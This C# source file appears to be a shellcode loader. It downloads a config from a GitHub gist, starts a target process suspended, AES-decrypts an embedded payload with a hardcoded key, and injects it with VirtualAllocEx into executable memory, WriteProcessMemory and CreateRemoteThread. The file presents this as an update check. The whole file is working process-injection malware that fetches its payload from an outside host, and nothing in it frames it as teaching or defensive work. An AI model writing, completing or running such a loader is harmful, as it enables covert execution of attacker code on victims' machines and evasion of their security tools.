using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;

namespace sharp
{
    public class Config
    {
        public string Target { get; set; }
        public string Version { get; set; }
        public string Payload { get; set; }
    }

    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(
           IntPtr hProcess,
           IntPtr lpThreadAttributes,
           uint dwStackSize,
           IntPtr lpStartAddress,
           IntPtr lpParameter,
           uint dwCreationFlags,
           out uint lpThreadId
       );
        public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }
        static async Task Main()
        {
            using var client = new HttpClient();

            var response = await client.GetStringAsync("https://gist.github.com/Oicellyael/aa5ad596db1e2fadee3378a251c3afd5/raw/config.json");
            var options = new JsonSerializerOptions
            {
                AllowTrailingCommas = true,
                ReadCommentHandling = JsonCommentHandling.Skip
            };

            var config = JsonSerializer.Deserialize<Config>(response, options);
            string newversion = "1.0.1";

            if (config != null)
            {
                Console.WriteLine(config.Target);
                if (config.Version != newversion)
                {
                    Console.WriteLine("need update to " + config.Version);
                }
                else
                {
                    Console.WriteLine("up to date");
                }
                STARTUPINFO startinfo = new STARTUPINFO();
                startinfo.cb = (uint)Marshal.SizeOf(startinfo);

                PROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

                bool success = CreateProcess(
                    null,
                    config.Target,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x00000004,
                    IntPtr.Zero,
                    null,
                    ref startinfo,
                    out process_info
                );

                if (success)
                {
                    Console.WriteLine("Process ID: " + process_info.dwProcessId);
                }
                else
                {

                    Console.WriteLine("Fail! Error code: " + Marshal.GetLastWin32Error());
                }
                string encryptedBase64 = config.Payload;
                byte[] encryptedBytes = Convert.FromBase64String(encryptedBase64);
                byte[] key = System.Text.Encoding.UTF8.GetBytes("12345678901234567890123456789012");
                byte[] iv = System.Text.Encoding.UTF8.GetBytes("1234567890123456");

                // 3. Расшифровываем
                byte[] payload = AesDecrypt(encryptedBytes, key, iv);
                IntPtr remoteAddress = VirtualAllocEx(
                    process_info.hProcess,
                    IntPtr.Zero,
                    (UIntPtr)payload.Length,
                    0x3000,
                    0x40);
                if (remoteAddress != IntPtr.Zero)
                {
                    Console.WriteLine("Memory allocated successfully at address: " + "0x" + remoteAddress.ToString("X"));

                }
                else
                {
                    Console.WriteLine("Failed to allocate memory. Error code: " + Marshal.GetLastWin32Error());
                }
                string base64Payload = config.Payload;
                
                IntPtr bytesWritten;
                bool writeSuccess = WriteProcessMemory(
                    process_info.hProcess,
                    remoteAddress,
                    payload,
                   payload.Length,
                   out bytesWritten
                );
                if (writeSuccess)
                {
                    Console.WriteLine("Payload written successfully. Bytes written: " + bytesWritten);
                }
                else
                {
                    Console.WriteLine("Failed to write payload. Error code: " + Marshal.GetLastWin32Error());
                }
                IntPtr hThread = CreateRemoteThread(
                    process_info.hProcess,
                    IntPtr.Zero,
                    0,
                    remoteAddress,
                    IntPtr.Zero,
                    0,
                    out uint threadId
                );

                if (hThread != IntPtr.Zero)
                {
                    Console.WriteLine($"[+] Stream started! Stream ID: {threadId}");
                    CloseHandle(hThread);
                }
                else
                {
                    Console.WriteLine("[-] Failed to create stream. Error: " + Marshal.GetLastWin32Error());
                }
            }
            Console.ReadKey();
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
}
